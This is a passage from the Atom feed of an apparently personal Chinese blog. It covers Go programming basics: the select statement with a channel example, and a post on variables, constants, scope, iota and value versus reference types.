statement(s);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="select语句"><a href="#select语句" class="headerlink" title="select语句"></a>select语句</h2><p>类似<code>switch</code>但是<code>select</code>语句只能用于通道操作，每个case必须是一个通道操作。</p><p>select 语句会监听所有指定的通道上的操作，一旦其中一个通道准备好就会执行相应的代码块。</p><p>如果多个通道都准备好，那么 select 语句会随机选择一个通道执行。如果没有case可运行：如果有 default 子句，则执行该语句；如果没有 default 子句，select 将阻塞，直到某个通道可以运行；Go 不会重新对 channel 或值进行求值。它将阻塞，直到有<code>case</code>可运行。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>   <span class="hljs-string">&quot;fmt&quot;</span><br>   <span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Chann</span><span class="hljs-params">(ch <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, stopCh <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)</span></span> &#123;<br>   <span class="hljs-keyword">for</span> j := <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span>; j++ &#123;<br>      ch &lt;- j<br>      time.Sleep(time.Second)<br>   &#125;<br>   stopCh &lt;- <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br>    c := <span class="hljs-number">0</span>   <br>    stopCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)<br><br>    <span class="hljs-keyword">go</span> Chann(ch, stopCh)<br><br>    <span class="hljs-keyword">for</span> &#123;<br>        <span class="hljs-keyword">select</span> &#123;<br>        <span class="hljs-keyword">case</span> c = &lt;-ch:<br>            fmt.Println(<span class="hljs-string">&quot;Receive C&quot;</span>, c)<br>        <span class="hljs-keyword">case</span> s := &lt;-ch:<br>            fmt.Println(<span class="hljs-string">&quot;Receive S&quot;</span>, s)<br>        <span class="hljs-keyword">case</span> _ = &lt;-stopCh:<br>            <span class="hljs-keyword">goto</span> end<br>        &#125;<br>    &#125;<br>    end:<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;条件语句&quot;&gt;&lt;a href=&quot;#条件语句&quot; class=&quot;headerlink&quot; title=&quot;条件语句&quot;&gt;&lt;/a&gt;条件语句&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Go&lt;/code&gt;没有三目运算符，所以不支持 ?: 形式的条件判断。&lt;/p&gt;
&lt;/bl</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>变量与常量</title>
    <link href="http://lexlady.top/2023/05/25/Golang/go-variable/"/>
    <id>http://lexlady.top/2023/05/25/Golang/go-variable/</id>
    <published>2023-05-25T07:44:28.000Z</published>
    <updated>2024-04-16T12:58:23.569Z</updated>
    
    <content type="html"><![CDATA[<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h2><p><code>var</code>关键字</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>指定变量类型，如果没有初始化，则变量默认为零值。</p><blockquote><p>零值就是变量没有做初始化时系统默认设置的值。<br>数值类型（包括complex64&#x2F;128）为<code>0</code><br>布尔类型为<code>false</code><br>字符串为<code> &quot;&quot;</code>（空字符串）<br>以下几种类型为<code>nil</code>：<br>指针、数组、map、channel、函数、接口</p></blockquote><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>根据值自行判定变量类型。</p><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><p>格式：<code>v_name := value</code></p><p>如果变量已经使用<code>var</code>声明过了，再使用<code>:=</code>声明变量，就产生编译错误。</p><blockquote><p>多变量声明<br><code>var vname1, vname2, vname3 type </code>相同类型的多个变量<br><code>vname1, vname2, vname3 = v1, v2, v3</code> </p><p><code>var vname1, vname2, vname3 = v1, v2, v3</code>自动推断类型  </p><p>一般用于声明全局变量<br>var {<br>    vname type1<br>    vname type2<br>}</p></blockquote><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>如果你在定义变量<code>a</code>之前使用它，则会得到编译错误<code>undefined: a</code></p><p>如果你声明了一个局部变量却没有在相同的代码块中使用它，同样会得到编译错误，<code>a declared but not used</code>；但是全局变量是允许声明但不使用的。</p><p>如果你想要交换两个变量的值，则可以简单地使用<code>a, b = b, a</code>，两个变量的类型必须是相同。这被称为<strong>并行</strong>或<strong>同时</strong>赋值。</p><p>并行赋值也被用于当一个函数返回多个返回值时，比如这里的<code>val</code>和错误<code>err</code>是通过调用<code>Func1</code>函数同时得到：<code>val, err = Func1(var1)</code></p><p>空白标识符<code>_</code>也被用于抛弃值，如值<code>5</code>在：<code>_, b = 5, 7</code>中被抛弃。</p><h1 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h1><p><code>Go</code>语言中变量可在三个地方中声明</p><ul><li>函数内定义：局部变量</li><li>函数外定义：全局变量</li><li>函数定义中：形式参数</li></ul><p>局部变量的作用域只在函数体内，参数和返回值变量也是局部变量。</p><p>全局变量可以在整个包甚至外部包（被导出后）使用。</p><p><code>Go</code>语言程序中全局变量与局部变量名称可以相同，但是函数内的<strong>局部变量会被优先考虑</strong>。</p><p>形式参数会作为函数的局部变量来使用。</p><blockquote><p>可通过花括号来控制变量的作用域，花括号中的变量是单独的作用域，同名变量会覆盖外层。</p></blockquote><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>常量是一个简单值的标识符，在程序运行时，不会被修改的量。</p><p>常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。</p><p>常量的定义格式：<code>const identifier [type] = value</code>  </p><blockquote><p>你可以省略类型说明符<code>[type]</code>，编译器可以根据变量的值来推断其类型。</p><ul><li>显式类型定义：<code>const b string = &quot;abc&quot;</code></li><li>隐式类型定义：<code>const b = &quot;abc&quot;</code><br>多个相同类型的声明可以简写为：<code>const c_name1, c_name2 = value1, value2</code></li></ul></blockquote><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">const</span> LENGTH <span class="hljs-type">int</span> = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">const</span> WIDTH <span class="hljs-type">int</span> = <span class="hljs-number">6</span><br>    <span class="hljs-keyword">var</span> area <span class="hljs-type">int</span><br>    <span class="hljs-keyword">const</span> a, b, c = <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;str&quot;</span> <span class="hljs-comment">//多重赋值</span><br>    <span class="hljs-keyword">const</span> (<br>        Unknow = <span class="hljs-number">0</span><br>        Female = <span class="hljs-number">1</span><br>        Male = <span class="hljs-number">2</span><br>    ) <span class="hljs-comment">//枚举赋值</span><br><br>    area = LENGTH * WIDTH<br>    fmt.Printf(<span class="hljs-string">&quot;面积为：%d\n&quot;</span>, area)<br>    <span class="hljs-built_in">println</span>(a, b, c)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>常量可以用<code>len(), cap(), unsafe.Sizeof()</code>函数计算表达式的值。常量表达式中，函数必须是内置函数，否则编译不过。</p></blockquote><h2 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h2><p><code>iota</code>，特殊常量，可认为是一个可以被编译器修改的常量。</p><p><code>iota</code>在<code>const</code>关键字出现时将被重置为 0(const 内部的第一行之前)，const 中<strong>每新增一行常量声明</strong>将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。</p><!-- TODO：**待补充** --><h1 id="值类型和引用类型"><a href="#值类型和引用类型" class="headerlink" title="值类型和引用类型"></a>值类型和引用类型</h1><p>使用值类型的变量直接指向<strong>存在内存中的值</strong>，一个引用类型的变量<code>r1</code>存储的是<code>r1</code>的值所在的<strong>内存地址</strong>（数字），或内存地址中第一个字所在的位置。也称指针<br><code>&amp;</code>符号取变量的内存地址。<br>值类型变量使用等号<code>=</code>将一个变量的值赋值给另一个变量时，实际上是在内存中将 i 的值进行了拷贝，使用赋值语句<code>r2 = r1</code>时，只有引用（地址）被复制。对r1的修改也会对r2产生影响</p><p>&#x2F;&#x2F;</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; class=&quot;headerlink&quot; title=&quot;变量&quot;&gt;&lt;/a&gt;变量&lt;/h1&gt;&lt;h2 id=&quot;变量声明&quot;&gt;&lt;a href=&quot;#变量声明&quot; class=&quot;headerlink&quot; title=&quot;变量声明&quot;&gt;&lt;/a&gt;变量声明&lt;/h</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
</feed>
